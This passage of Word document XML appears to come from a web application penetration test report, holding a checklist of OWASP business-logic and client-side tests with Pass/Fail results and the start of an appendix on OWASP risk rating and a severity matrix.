        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="1728C0D1"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18C25F56"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092EFFBB" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6B155237"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 Integrity Checks (OTG-BUSLOGIC-003)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="2C000B68"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54C9D81A"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73D035D0" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="15AD6905"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 for Process Timing (OTG-BUSLOGIC-004)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="38A2B36B"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224EA292"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5E743B2E" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2C0F3678"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 Number of Times a Function Can be Used Limits (OTG-BUSLOGIC-005)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="5EA95C81"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0B375D79"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3DBF8F7C" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="78F056B8"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the Circumvention of Work</w:t>
            </w:r>
            <w:r>
              <w:t>f</w:t>
            </w:r>
            <w:r w:rsidRPr="00AD7173">
              <w:t>lows (OTG-BUSLOGIC-006)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="373BC668"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6D5107C4"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6609AEB1" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1C7F9DEF"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 Defenses Against Application Mis</w:t>
            </w:r>
            <w:r>
              <w:t>u</w:t>
            </w:r>
            <w:r w:rsidRPr="00AD7173">
              <w:t>se (OTG-BUSLOGIC-007)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="66DAA74C"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4F6801D3"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58A3DF64" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="21BDDC77"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 Upload of Unexpected File Types (OTG-BUSLOGIC-008)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="0BBF929B"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rPr>
                <w:b/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00271CFB">
              <w:rPr>
                <w:b/>
                <w:color w:val="FF0000"/>
              </w:rPr>
              <w:t>Fail</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0001157D" w:rsidRPr="00271CFB" w14:paraId="76B83463"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641ADA5C" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7537EC09" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00271CFB" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:cnfStyle w:val="000000100000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="1" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
              <w:rPr>
                <w:bCs/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00271CFB">
              <w:rPr>
                <w:bCs/>
              </w:rPr>
              <w:t>Test Upload of Malicious Files (OTG-BUSLOGIC-009)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="7D6715B1" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00271CFB" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:cnfStyle w:val="000000100000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="1" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
              <w:rPr>
                <w:bCs/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00271CFB">
              <w:rPr>
                <w:bCs/>
              </w:rPr>
              <w:t>Pass</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007B584C" w:rsidRPr="00AD7173" w14:paraId="52D4E393"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3BEBB5E" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AD7173">
              <w:t>Client Side Testing</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1726D34D"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DOM based Cross Site Scripting (OTG-CLIENT-001)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="4784F5C2"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789846DB"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C2B5EE9" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="36E4E8B0"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JavaScript Execution (OTG-CLIENT-002)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="06BF6BD4"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1F2CAAA6"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04E32B29" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="19FB7114"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HTML Injection (OTG-CLIENT-003)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="5E2DD40C"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5BEAD38C"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0F9B776D" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5A415142"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Client Side URL Redirect (OTG-CLIENT-004)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="16D747D1"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23A53970"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5AC28BA8" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="74749826"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CSS Injection (OTG-CLIENT-005)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="37FDEE21"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55DD1F73"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1499422D" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="568C6C92"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Client Side Resource Manipulation (OTG-CLIENT-006)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="642E0E07"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2E938166"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1F0C50C0" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3682A4A7"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 Cross Origin Resource Sharing (OTG-CLIENT-007)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="4CF35869"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08E12751"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6BD7E3F1" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5450961A"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for Cross Site Flashing (OTG-CLIENT-008)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="329B3F89"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64AF24DA"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40ADF8E9" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6D32DC1B"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Testing for Clickjacking (OTG-CLIENT-009)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="5332F35D"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2494671A"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2E25B8E1" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="783268FA"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Testing Web Sockets (OTG-CLIENT-010)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="40F22579"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7B584C" w:rsidRPr="00AD7173" w14:paraId="5D0A2512" w14:textId="77777777" w:rsidTr="0001157D">
        <w:trPr>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6C44299C" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0DFD255C" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:cnfStyle w:val="000000000000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r w:rsidRPr="00AD7173">
              <w:t>Test Web Messaging (OTG-CLIENT-011)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="438EEC40" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">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01157D" w:rsidRPr="00AD7173" w14:paraId="3EED5AFE" w14:textId="77777777" w:rsidTr="000115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38" w:type="dxa"/>
            <w:vMerge/>
          </w:tcPr>
          <w:p w14:paraId="693D0ADD" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6237" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="65D6ACA1" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:cnfStyle w:val="000000100000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="1" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r w:rsidRPr="00AD7173">
              <w:t>Test Local Storage (OTG-CLIENT-012)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1272" w:type="dxa"/>
            <w:noWrap/>
          </w:tcPr>
          <w:p w14:paraId="77A98F5A" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00AD7173" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:cnfStyle w:val="000000100000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="1" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r w:rsidRPr="00AD7173">
              <w:t>Pass</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="32C8A04F" w14:textId="77777777" w:rsidR="000F54D3" w:rsidRPr="000F54D3" w:rsidRDefault="000F54D3" w:rsidP="000F54D3"/>
    <w:p w14:paraId="55BACEF7" w14:textId="77777777" w:rsidR="00363892" w:rsidRPr="00A85694" w:rsidRDefault="00184871" w:rsidP="00363892">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="27" w:name="_Toc34146508"/>
      <w:r>
        <w:rPr>
          <w:caps w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">APPENDIX </w:t>
      </w:r>
      <w:r w:rsidR="00281781">
        <w:rPr>
          <w:caps w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>B</w:t>
      </w:r>
      <w:r w:rsidR="001D667D">
        <w:rPr>
          <w:caps w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:bookmarkEnd w:id="23"/>
      <w:r>
        <w:rPr>
          <w:caps w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>RISK CLASSIFICATION</w:t>
      </w:r>
      <w:bookmarkEnd w:id="27"/>
    </w:p>
    <w:p w14:paraId="7AA2B284" w14:textId="77777777" w:rsidR="0091053E" w:rsidRDefault="0091053E" w:rsidP="0091053E">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="330" w:lineRule="atLeast"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>Each risk and possible threat is assigned a severity level base on the OWASP Risk Rating Methodology</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EA77B85" w14:textId="77777777" w:rsidR="0091053E" w:rsidRDefault="0091053E" w:rsidP="0091053E">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="330" w:lineRule="atLeast"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>The OWASP approach presented here is based on these standard methodologies and is customized for application security.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A3A8A0A" w14:textId="77777777" w:rsidR="00430B4E" w:rsidRDefault="0091053E" w:rsidP="0091053E">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="330" w:lineRule="atLeast"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>The standard risk model:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02CE6A9E" w14:textId="77777777" w:rsidR="0091053E" w:rsidRDefault="0091053E" w:rsidP="0001157D">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="330" w:lineRule="atLeast"/>
        <w:ind w:firstLine="720"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="333333"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>Risk = Likelihood * Impact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849"/>
        <w:gridCol w:w="1994"/>
        <w:gridCol w:w="2009"/>
        <w:gridCol w:w="1995"/>
      </w:tblGrid>
      <w:tr w:rsidR="00A21264" w:rsidRPr="002F7E5E" w14:paraId="0B7FC27C" w14:textId="77777777" w:rsidTr="000F54D3">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="10338" w:type="dxa"/>
            <w:gridSpan w:val="5"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="43DCDFBA" w14:textId="77777777" w:rsidR="00A21264" w:rsidRPr="002F7E5E" w:rsidRDefault="000F54D3" w:rsidP="0030517C">
            <w:pPr>
              <w:pStyle w:val="Content"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                <w:b/>
                <w:sz w:val="22"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002F7E5E">
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                <w:b/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>OVERALL RISK SEVERITY</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A21264" w:rsidRPr="002F7E5E" w14:paraId="6721C749" w14:textId="77777777" w:rsidTr="000316BB">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1838" w:type="dxa"/>
            <w:vMerge w:val="restart"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="3F54C658" w14:textId="77777777" w:rsidR="00A21264" w:rsidRPr="002F7E5E" w:rsidRDefault="000F54D3" w:rsidP="0030517C">
            <w:pPr>
              <w:pStyle w:val="Content"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                <w:b/>
                <w:sz w:val="22"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002F7E5E">
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                <w:b/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>IMPACT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1985" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="3249F9C2" w14:textId="77777777" w:rsidR="00A21264" w:rsidRPr="002F7E5E" w:rsidRDefault="00A21264" w:rsidP="0030517C">
            <w:pPr>
              <w:pStyle w:val="Content"/>
              <w:spacing w:after="120"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                <w:b/>
                <w:bCs/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002F7E5E">
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>HIGH</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2171" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="5AFF4E82" w14:textId="77777777" w:rsidR="00A21264" w:rsidRPr="002F7E5E" w:rsidRDefault="00A21264" w:rsidP="0030517C">
            <w:pPr>
              <w:pStyle w:val="Content"/>
              <w:spacing w:after="120"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002F7E5E">
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2172" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FF0000"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="0F73B290" w14:textId="77777777" w:rsidR="00A21264" w:rsidRPr="002F7E5E" w:rsidRDefault="00A21264" w:rsidP="0030517C">
            <w:pPr>
              <w:pStyle w:val="Content"/>
              <w:spacing w:after="120"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002F7E5E">
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2172" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC0CB"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="6495EFEA" w14:textId="77777777" w:rsidR="00A21264" w:rsidRPr="002F7E5E" w:rsidRDefault="00A21264" w:rsidP="0030517C">
            <w:pPr>
              <w:pStyle w:val="Content"/>
              <w:spacing w:after="120"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002F7E5E">
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
              <w:t>Critical</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A21264" w:rsidRPr="002F7E5E" w14:paraId="4A5555C5" w14:textId="77777777" w:rsidTr="000F54D3">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1838" w:type="dxa"/>
            <w:vMerge/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="15E72F36" w14:textId="77777777" w:rsidR="00A21264" w:rsidRPr="002F7E5E" w:rsidRDefault="00A21264" w:rsidP="0030517C">
            <w:pPr>
              <w:pStyle w:val="Content"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1985" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="610AEF79" w14:textId="77777777" w:rsidR="00A21264" w:rsidRPr="002F7E5E" w:rsidRDefault="00A21264" w:rsidP="0030517C">
            <w:pPr>
              <w:pStyle w:val="Content"/>
              <w:spacing w:after="120"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                <w:b/>
                <w:bCs/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002F7E5E">
